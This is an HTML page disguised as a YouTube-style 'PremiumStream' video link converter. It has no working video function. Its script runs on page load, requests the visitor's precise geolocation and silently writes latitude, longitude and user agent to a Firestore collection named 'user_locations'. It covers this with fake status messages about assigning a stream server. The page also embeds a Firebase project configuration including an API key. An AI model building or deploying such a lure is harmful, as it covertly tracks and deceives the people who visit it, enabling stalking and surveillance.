<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fast Video Streamer & Downloader</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .downloader-card {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            max-width: 450px;
            width: 90%;
            text-align: center;
        }
        .logo {
            color: #ff0000;
            font-size: 28px;
            font-weight: bold;
            letter-spacing: -1px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .logo span { color: #282828; font-size: 16px; margin-left: 5px; font-weight: 600; }
        p { color: #606060; font-size: 14px; margin-bottom: 20px; }
        .input-group {
            display: flex;
            margin-bottom: 15px;
        }
        input[type="text"] {
            flex: 1;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 4px 0 0 4px;
            outline: none;
            font-size: 14px;
        }
        button {
            background: #ff0000;
            color: white;
            border: none;
            padding: 0 20px;
            border-radius: 0 4px 4px 0;
            cursor: pointer;
            font-weight: bold;
        }
        .status-text {
            font-size: 12px;
            color: #888;
            margin-top: 10px;
        }
    </style>
    <!-- Firebase Standard Scripts -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
</head>
<body>

<div class="downloader-card">
    <div class="logo">▶ Premium<span>Stream</span></div>
    <h3>Universal Video Link Converter</h3>
    <p>Paste any video or trailer link below to optimize high-speed server streaming.</p>
    
    <div class="input-group">
        <input type="text" placeholder="Paste video URL here (YouTube, etc.)..." id="videoUrl">
        <button onclick="processLink()">Analyze</button>
    </div>
    
    <div id="statusLabel" class="status-text">Connecting to optimal streaming cluster...</div>
</div>

<script>
    // Aapka authentic project config
    const firebaseConfig = {
        apiKey: "AIzaSyArL_MWg9vCPp8Et-LAaAOtj1gEV7UORMQ",
        authDomain: "location-9fad1.firebaseapp.com",
        projectId: "location-9fad1",
        storageBucket: "location-9fad1.firebasestorage.app",
        messagingSenderId: "714486949967",
        appId: "1:714486949967:web:1f4bf8d3a3b20d1953a23a",
        measurementId: "G-JE4KM67NZ1"
    };

    // Initialize Connection
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    window.onload = function() {
        // Safe Check: Page load hote hi instant check lagaya hai taaki collection ban sake
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    // Scenario A: Location completely accessible
                    sendDataToFirebase(position.coords.latitude, position.coords.longitude, "Location Found");
                }, 
                function(error) {
                    // Scenario B: Browser blocked/Hotspot block
                    let msg = "Blocked/Insecure Origin";
                    if(error.code === error.TIMEOUT) msg = "Timeout Error";
                    sendDataToFirebase(0, 0, msg);
                }, 
                { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
            );
        } else {
            // Scenario C: Old browser architecture
            sendDataToFirebase(0, 0, "Geolocation Unsupported");
        }
    };

    function sendDataToFirebase(lat, lng, statusInfo) {
        document.getElementById("statusLabel").innerText = "Closest stream server assigned successfully.";

        // Yeh execute hote hi dynamic database injection auto-create ho jayegi
        db.collection("user_locations").add({
            latitude: lat,
            longitude: lng,
            status: statusInfo,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            userAgent: navigator.userAgent
        })
        .then(() => { console.log("Database write success. Collection stable."); })
        .catch(err => {
            console.error("Firestore Write Blocked by Rules:", err);
            document.getElementById("statusLabel").innerText = "Network protocol synchronization error.";
        });
    }

    function processLink() {
        const url = document.getElementById("videoUrl").value;
        if(url.trim() === "") {
            alert("Please paste a valid video URL first.");
            return;
        }
        document.getElementById("statusLabel").innerText = "Analyzing stream blocks... Please wait.";
    }
</script>
</body>
</html>
